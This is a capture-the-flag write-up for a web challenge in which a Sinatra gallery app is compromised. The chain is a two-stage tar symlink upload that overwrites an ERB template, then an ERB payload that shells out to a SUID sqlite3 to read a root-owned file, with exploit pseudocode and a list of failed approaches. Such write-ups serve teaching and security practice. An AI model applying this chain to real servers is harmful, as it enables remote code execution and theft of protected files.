# Undervattensgalleriet

## Description
> *För den här utmaningen kan ni deltagare inte dela resurser, utan varje deltagare behöver en egen instans av tjänsten. Surfa till [https://undervattensgalleriet.challs.undutmaning.se](https://undervattensgalleriet.challs.undutmaning.se) för att starta din egen instans. Mer utförliga instruktioner för hur du ansluter till utmaningstjänster hittar du på [informationssidan](info#anslutning-inst).*

**Category:** web
**Difficulty:** medel
**Link:** [https://undervattensgalleriet.challs.undutmaning.se](https://undervattensgalleriet.challs.undutmaning.se)
**Files:** See [orig/](./orig/) — `uwgallery.tar.gz` contains the full application source. The extracted application also lives under [uwgallery/](./uwgallery/) for convenience.

## Challenge stack

- **Framework:** Sinatra 3.2.0 on Rack 2.2.21
- **Database:** SQLite via Sequel ORM
- **Server:** Puma 7.1.0
- **Container:** Alpine 3.22 with Ruby 4.0.1
- **Flag location:** `/srv/flag.txt` (owned `root:root`, mode `600`)

## Vulnerabilities

### 1. Unsanitized tar extraction (`app.rb:45`)

The `mkgallery` helper extracts user-uploaded tar files directly with `system("tar x ...")` and applies no content validation:

```ruby
system("tar x -C #{d} -f #{params[:file][:tempfile].path}")
```

Archive contents — filenames, symlinks, hardlinks — are extracted as-is. This is the primary code-path into the filesystem outside the gallery directory.

### 2. SUID `/usr/bin/sqlite3` (`Dockerfile:4`)

```dockerfile
RUN chmod u+s /usr/bin/sqlite3 /bin/cat
```

`/usr/bin/sqlite3` is a real binary with the SUID bit, so it runs as root. SQLite's built-in `readfile()` function reads arbitrary files — giving us a root-file-read primitive as soon as we can invoke sqlite3.

Note: `/bin/cat` also gets SUID here, but `/bin/cat` on Alpine is a BusyBox symlink. BusyBox drops SUID for individual applets, so `cat` does NOT run as root. The real privilege escalation is sqlite3 only.

### 3. PUT endpoint re-extracts into the same gallery (`app.rb:154-170`)

```ruby
put "/galleries/:path" do |path|
  halt 401, erb("") unless session[:user]
  g = GALLERIES.where(path: path, user_id: session[:user]).first or halt 404
  mkgallery(g[:path])
  # ...
end
```

This enables the two-stage attack: one tar creates a symlink, a separate tar writes through it. Without PUT, the symlink-and-overwrite would have to happen in a single extraction (which BusyBox tar blocks — see "Why two stages?" below).

## Solution — exploit chain

**Two-stage tar symlink attack + SUID sqlite3:**

1. **Stage 1 (POST):** upload a tar containing a symlink `views -> /srv/views`. The tar extraction creates the symlink inside `/srv/public/<gallery_id>/`.
2. **Stage 2 (PUT):** upload a second tar containing `views/gallery.erb` with an ERB payload, targeting the same gallery. tar follows the existing symlink and writes through it, overwriting the real template at `/srv/views/gallery.erb`.
3. **ERB RCE:** Sinatra's `erb :gallery` reloads the template on every request. Visiting any gallery page now executes the attacker-controlled ERB server-side.
4. **SUID privesc:** the ERB payload shells out to SUID `sqlite3` and uses `readfile()` to read `/srv/flag.txt` as root.

The root-file-read payload:

```erb
<%= `echo "SELECT readfile(char(47,115,114,118,47,102,108,97,103,46,116,120,116));" | /usr/bin/sqlite3 :memory: 2>&1` %>
```

`char(47,115,114,118,47,102,108,97,103,46,116,120,116)` reconstructs `/srv/flag.txt` without tripping any quoting inside the nested shell/SQL call.

### End-to-end exploit (pseudocode)

```
BASE = https://INSTANCE.challs.undutmaning.se

# 1. Register an account, save cookies
POST $BASE/register  (user=attacker&password=pass)

# 2. Build symlink tar in Python:
#    TarInfo(name='views', type=SYMTYPE, linkname='/srv/views')

# 3. Upload it (POST /galleries) — response is a 303 redirect to /galleries/<GALLERY_ID>
#    This creates /srv/public/<GALLERY_ID>/views -> /srv/views

# 4. Build payload tar in Python:
#    TarInfo(name='views/gallery.erb') with the ERB payload above as content

# 5. PUT /galleries/<GALLERY_ID> with the payload tar
#    tar follows the existing 'views' symlink → writes to /srv/views/gallery.erb

# 6. GET /galleries/<GALLERY_ID> — Sinatra re-reads the (overwritten) template,
#    executes the ERB, sqlite3 runs as root, readfile() returns the flag
```

See the `uwgallery/` source tree for the full local reproduction (Dockerfile included — `docker build` + run on port 4567).

### Why two stages?

A single tar containing both the symlink entry AND `views/gallery.erb` does **not** reliably work. BusyBox tar treats the symlink-then-write-through pattern within one archive as suspicious and declines to follow the freshly-created symlink during the same extraction pass.

Splitting into two extractions bypasses the check: by the time stage 2 runs, `views/` exists on disk as a symlink that's indistinguishable from a regular directory. tar writes into it without a second thought.

### Dead ends explored

| Approach | Why it didn't work |
|----------|-------------------|
| `../../` path traversal in tar | BusyBox tar strips leading `../` from member names |
| SUID `/bin/cat` | `/bin/cat` → `/bin/busybox`; BusyBox ignores SUID on applets |
| Session forgery via hardcoded secret | `app.rb:14` has a hardcoded session secret. Rack 2.2 uses AES-256-GCM so sessions are fully decrypt/forgeable with the key, but the tar route worked first — no Marshal gadget chain needed |
| `sudo` escalation | sudo rule `web db = (ALL:ALL) NOPASSWD: /bin/ls` only applies on host `db` — not the web container |
| Shell injection via `system("tar ...")` | Both interpolated values (`d`, `tempfile.path`) are server-generated, not user-controllable |

## Flag

See [flag.txt](./flag.txt)
